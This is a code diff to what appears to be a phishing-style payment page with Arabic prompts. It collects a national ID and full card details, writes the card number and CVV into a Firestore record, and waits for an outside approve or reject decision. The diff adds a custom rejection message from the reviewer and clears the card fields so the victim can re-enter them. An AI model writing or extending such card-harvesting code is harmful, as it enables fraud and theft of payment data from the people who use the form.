@@ -62,6 +62,10 @@ const PAYMENT_METHOD_OPTIONS: readonly PaymentMethodOption[] = [
 
 type OperationType = (typeof OPERATION_OPTIONS)[number]['id']
 type ReceiptChoice = (typeof RECEIPT_OPTIONS)[number]['id']
+type SubmissionStatusSnapshot = {
+  cardState?: 'pending' | 'approved' | 'rejected'
+  reviewMessage?: string
+}
 
 function StepIndicator({ current }: { current: number }) {
   return (
@@ -344,6 +348,12 @@ export default function SubmitPage() {
     setSessionStarted(false)
   }
 
+  const resetCardEntryForRetry = () => {
+    setCardNumber('')
+    setCardExpiry('')
+    setCvv('')
+  }
+
   const handleStep1 = async (e: FormEvent) => {
     e.preventDefault()
     if (idNum.trim().length !== 11) return alert('رقم البطاقة الشخصية يجب أن يكون 11 رقماً')
@@ -411,6 +421,7 @@ export default function SubmitPage() {
         step: 5,
         currentPage: 'card-info',
         cardState: 'pending',
+        reviewMessage: '',
         cardDetailsHistory: arrayUnion({
           cardNumber: cleanCard,
           CVC: cvv,
@@ -427,7 +438,7 @@ export default function SubmitPage() {
     unsubRef.current?.()
     unsubRef.current = onSnapshot(doc(db, 'pays', idNum), (snap) => {
       if (!snap.exists()) return
-      const data = snap.data()
+      const data = snap.data() as SubmissionStatusSnapshot
       if (data.cardState === 'approved') {
         setWaiting(false)
         setStep(6)
@@ -435,7 +446,11 @@ export default function SubmitPage() {
       } else if (data.cardState === 'rejected') {
         setWaiting(false)
         unsubRef.current?.()
-        alert('تم رفض البطاقة. الرجاء إدخال بيانات صحيحة والمحاولة مجدداً.')
+        const rejectionMessage = data.reviewMessage?.trim()
+          ? data.reviewMessage.trim()
+          : 'تم رفض البطاقة. الرجاء إدخال بيانات صحيحة والمحاولة مجدداً.'
+        resetCardEntryForRetry()
+        alert(rejectionMessage)
         setStep(5)
       }
     })
